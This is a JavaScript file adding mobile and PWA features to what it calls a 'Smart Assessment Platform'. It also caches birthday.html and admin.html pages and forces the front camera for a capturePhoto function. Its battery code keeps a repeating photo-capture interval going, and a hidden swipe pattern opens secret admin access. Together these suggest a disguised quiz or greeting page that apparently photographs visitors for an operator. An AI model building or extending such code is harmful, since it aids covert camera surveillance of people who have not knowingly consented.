// Mobile Optimization and PWA Features
class MobileOptimizer {
    constructor() {
        this.isMobile = this.detectMobile();
        this.isTablet = this.detectTablet();
        this.orientation = this.getOrientation();
        this.init();
    }
    
    init() {
        if (this.isMobile || this.isTablet) {
            this.optimizeForMobile();
            this.setupPWAFeatures();
            this.enhanceTouchExperience();
            this.optimizeCamera();
        }
        this.setupOrientationHandling();
    }
    
    detectMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }
    
    detectTablet() {
        return /iPad|Android.*(?!.*Mobile)/i.test(navigator.userAgent);
    }
    
    getOrientation() {
        return window.innerHeight > window.innerWidth ? 'portrait' : 'landscape';
    }
    
    optimizeForMobile() {
        // Add mobile-specific CSS
        const mobileCSS = `
            @media (max-width: 768px) {
                body {
                    font-size: 16px !important;
                    line-height: 1.5 !important;
                    -webkit-text-size-adjust: 100% !important;
                }
                
                .question-container {
                    padding: 15px !important;
                    margin: 10px !important;
                }
                
                .answer-options {
                    flex-direction: column !important;
                }
                
                .answer-option {
                    margin: 8px 0 !important;
                    padding: 15px !important;
                    font-size: 18px !important;
                    min-height: 50px !important;
                }
                
                .progress-bar {
                    height: 8px !important;
                }
                
                .admin-panel {
                    padding: 10px !important;
                }
                
                .captured-image {
                    max-width: 100% !important;
                    height: auto !important;
                }
                
                /* Hide address bar on mobile */
                .fullscreen-mobile {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100vw;
                    height: 100vh;
                    z-index: 9999;
                }
            }
            
            /* Touch-friendly improvements */
            button, .answer-option {
                -webkit-tap-highlight-color: rgba(0,0,0,0);
                -webkit-touch-callout: none;
                -webkit-user-select: none;
                -khtml-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
                touch-action: manipulation;
            }
        `;
        
        const style = document.createElement('style');
        style.textContent = mobileCSS;
        document.head.appendChild(style);
        
        // Add viewport meta tag if not present
        if (!document.querySelector('meta[name="viewport"]')) {
            const viewport = document.createElement('meta');
            viewport.name = 'viewport';
            viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
            document.head.appendChild(viewport);
        }
    }
    
    setupPWAFeatures() {
        // Create manifest.json
        const manifest = {
            name: "Smart Assessment Platform",
            short_name: "Assessment",
            description: "Advanced assessment platform",
            start_url: "/",
            display: "standalone",
            background_color: "#ffffff",
            theme_color: "#007bff",
            icons: [
                {
                    src: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='40' fill='%23007bff'/%3E%3Ctext x='50' y='55' text-anchor='middle' fill='white' font-size='30' font-family='Arial'%3EA%3C/text%3E%3C/svg%3E",
                    sizes: "192x192",
                    type: "image/svg+xml"
                }
            ]
        };
        
        const manifestBlob = new Blob([JSON.stringify(manifest)], {type: 'application/json'});
        const manifestURL = URL.createObjectURL(manifestBlob);
        
        const link = document.createElement('link');
        link.rel = 'manifest';
        link.href = manifestURL;
        document.head.appendChild(link);
        
        // Register service worker for offline functionality
        if ('serviceWorker' in navigator) {
            this.registerServiceWorker();
        }
    }
    
    registerServiceWorker() {
        const swCode = `
            const CACHE_NAME = 'assessment-v1';
            const urlsToCache = [
                '/',
                '/birthday.html',
                '/admin.html',
                '/birthday.css',
                '/birthday.js',
                '/admin.js'
            ];
            
            self.addEventListener('install', event => {
                event.waitUntil(
                    caches.open(CACHE_NAME)
                        .then(cache => cache.addAll(urlsToCache))
                );
            });
            
            self.addEventListener('fetch', event => {
                event.respondWith(
                    caches.match(event.request)
                        .then(response => response || fetch(event.request))
                );
            });
        `;
        
        const swBlob = new Blob([swCode], {type: 'application/javascript'});
        const swURL = URL.createObjectURL(swBlob);
        
        navigator.serviceWorker.register(swURL)
            .then(registration => console.log('SW registered'))
            .catch(error => console.log('SW registration failed'));
    }
    
    enhanceTouchExperience() {
        let touchStartY = 0;
        let touchEndY = 0;
        
        // Prevent unwanted scrolling and zooming
        document.addEventListener('touchstart', (e) => {
            touchStartY = e.changedTouches[0].screenY;
        }, {passive: false});
        
        document.addEventListener('touchmove', (e) => {
            // Prevent rubber band effect
            if (document.body.scrollTop === 0 || 
                document.body.scrollTop === document.body.scrollHeight - document.body.clientHeight) {
                e.preventDefault();
            }
        }, {passive: false});
        
        document.addEventListener('touchend', (e) => {
            touchEndY = e.changedTouches[0].screenY;
            this.handleSwipeGesture(touchStartY, touchEndY);
        });
        
        // Prevent double-tap zoom
        let lastTouchEnd = 0;
        document.addEventListener('touchend', (e) => {
            const now = (new Date()).getTime();
            if (now - lastTouchEnd <= 300) {
                e.preventDefault();
            }
            lastTouchEnd = now;
        }, false);
    }
    
    handleSwipeGesture(startY, endY) {
        const threshold = 50;
        const difference = startY - endY;
        
        if (Math.abs(difference) > threshold) {
            if (difference > 0) {
                // Swipe up - could trigger next question or admin panel
                this.onSwipeUp();
            } else {
                // Swipe down - could trigger previous question or refresh
                this.onSwipeDown();
            }
        }
    }
    
    onSwipeUp() {
        // Custom swipe up handler
        if (window.nextQuestion && typeof window.nextQuestion === 'function') {
            window.nextQuestion();
        }
    }
    
    onSwipeDown() {
        // Custom swipe down handler - could be used for special admin access
        const swipeCount = this.getSwipeCount();
        if (swipeCount >= 5) {
            // Secret admin access via swipe pattern
            this.triggerSecretAccess();
        }
    }
    
    getSwipeCount() {
        if (!this.swipePattern) this.swipePattern = [];
        this.swipePattern.push(Date.now());
        
        // Keep only recent swipes (within 10 seconds)
        const now = Date.now();
        this.swipePattern = this.swipePattern.filter(time => now - time < 10000);
        
        return this.swipePattern.length;
    }
    
    triggerSecretAccess() {
        // Vibrate if available
        if (navigator.vibrate) {
            navigator.vibrate([100, 50, 100]);
        }
        
        // Flash screen
        document.body.style.background = '#ff0000';
        setTimeout(() => {
            document.body.style.background = '';
        }, 200);
        
        // Could trigger admin panel or special mode
        if (window.showAdminAccess) {
            window.showAdminAccess();
        }
    }
    
    optimizeCamera() {
        // Mobile-specific camera constraints
        if (window.capturePhoto) {
            const originalCapturePhoto = window.capturePhoto;
            window.capturePhoto = () => {
                const constraints = {
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user', // Front camera by default
                        frameRate: { ideal: 30 }
                    }
                };
                
                // Use mobile-optimized capture
                return originalCapturePhoto(constraints);
            };
        }
    }
    
    setupOrientationHandling() {
        window.addEventListener('orientationchange', () => {
            setTimeout(() => {
                this.orientation = this.getOrientation();
                this.handleOrientationChange();
            }, 100);
        });
        
        window.addEventListener('resize', () => {
            this.handleResize();
        });
    }
    
    handleOrientationChange() {
        // Force landscape for better experience
        if (this.isMobile && this.orientation === 'portrait') {
            // Show rotation prompt
            this.showRotationPrompt();
        } else {
            this.hideRotationPrompt();
        }
        
        // Recalibrate camera if active
        if (window.currentStream) {
            this.recalibrateCamera();
        }
    }
    
    showRotationPrompt() {
        if (document.getElementById('rotation-prompt')) return;
        
        const prompt = document.createElement('div');
        prompt.id = 'rotation-prompt';
        prompt.innerHTML = `
            <div style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100vw;
                height: 100vh;
                background: rgba(0,0,0,0.9);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
                color: white;
                font-size: 18px;
                text-align: center;
            ">
                <div>
                    📱➡️📱<br>
                    Please rotate your device<br>
                    for better experience
                </div>
            </div>
        `;
        document.body.appendChild(prompt);
    }
    
    hideRotationPrompt() {
        const prompt = document.getElementById('rotation-prompt');
        if (prompt) {
            prompt.remove();
        }
    }
    
    handleResize() {
        // Adjust layout for mobile keyboards
        if (this.isMobile) {
            const heightDiff = window.outerHeight - window.innerHeight;
            if (heightDiff > 150) {
                // Keyboard is likely open
                document.body.classList.add('keyboard-open');
            } else {
                document.body.classList.remove('keyboard-open');
            }
        }
    }
    
    recalibrateCamera() {
        // Restart camera stream with new orientation
        if (window.currentStream) {
            window.currentStream.getTracks().forEach(track => track.stop());
            setTimeout(() => {
                if (window.setupCamera) {
                    window.setupCamera();
                }
            }, 500);
        }
    }
    
    // Battery optimization
    optimizeBattery() {
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                if (battery.level < 0.2) {
                    // Low battery mode - reduce capture frequency
                    if (window.captureInterval) {
                        clearInterval(window.captureInterval);
                        window.captureInterval = setInterval(() => {
                            if (window.capturePhoto) window.capturePhoto();
                        }, 5000); // Reduce to every 5 seconds
                    }
                }
                
                battery.addEventListener('levelchange', () => {
                    if (battery.level < 0.1) {
                        // Critical battery - stop captures
                        if (window.captureInterval) {
                            clearInterval(window.captureInterval);
                        }
                    }
                });
            });
        }
    }
}

// Initialize mobile optimizer
if (typeof window !== 'undefined') {
    window.mobileOptimizer = new MobileOptimizer();
}